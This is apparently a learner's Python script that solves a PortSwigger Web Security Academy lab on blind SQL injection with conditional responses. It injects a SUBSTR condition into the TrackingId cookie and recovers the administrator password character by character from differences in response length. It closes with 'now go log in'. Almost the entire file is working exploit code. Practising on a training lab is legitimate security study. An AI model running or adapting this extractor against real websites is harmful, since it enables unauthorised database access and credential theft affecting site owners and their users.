import requests

burp0_url = "https://ac331fd11ea1ac8dc0c6126900db00c8.web-security-academy.net:443/filter?category=Clothing%2c+shoes+and+accessories"
burp0_cookies = {"TrackingId": "qsU8oaKMStMXrqLN", "session": "LIBfZj5cgei2owtipqpjn3qrv14XZs9R"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://ac331fd11ea1ac8dc0c6126900db00c8.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)


# ######################  until here burp paste of request for python  ########################## #
# code by amotz for:# lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

import os

url = burp0_url
cookies = burp0_cookies
headers = burp0_headers
char_list = "abcdefghijklmnopqrstuvwxyz1234567890"
os.system('cls' if os.name=='nt' else 'clear')

def send_request_for_char():
    trackingId = burp0_cookies["TrackingId"] 
    loaded_cookies = burp0_cookies
    response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response.status_code, len(response.content))
    click = len(response.content) # establish baseline  - what is 'correct' content length
    print("lab 'tell' is a 'welcome screen' that is beeing loaded when any row returns a value,\n effectivly changing the content length:")
    print(f"SQLI 'tell' is: {click}")
    password = ""
    pass_index = 1
    ting = False # when ting is True: password is ready!

    while not ting:
        for i in char_list:
            # print(i)
            loaded_cookies["TrackingId"] = trackingId +f"'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"
            response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
            # print(f"ststus code: {response.status_code}")
            print("lab 'tell' is a 'welcome screen' that is beeing loaded when any row returns a value,\neffectivly changing the content length:")
            print(f"SQLI 'tell' is: {click}")
            print(f"letter being tested = {i}")
            print(f"response length = {len(response.content)}")
            print(f"\npartial password is:\n {password}\n")
            # print(f'PAYLOAD:\n{loaded_cookies["TrackingId"]}')
            print(f'\n\n\n\n\n\n\n\n')
            if len(response.content) == click:
                password += i
                # print("CLICK!")
                pass_index += 1
                break
            if i == char_list[-1] and password != "":
                os.system('cls' if os.name=='nt' else 'clear')
                ting = True
                print("\n\n\n\nTING! \npassword is ready")
                print(f"\npassword for username 'administrator' is:\n\n{password}\n\n\nnow go log in, you beautiful bastard!\n\n\n\n\n")
            if i == char_list[-1] and password =="":
                print(f"sorry but no TING check ingridiants:{char_list}")
                break


if __name__ == '__main__':
    send_request_for_char()

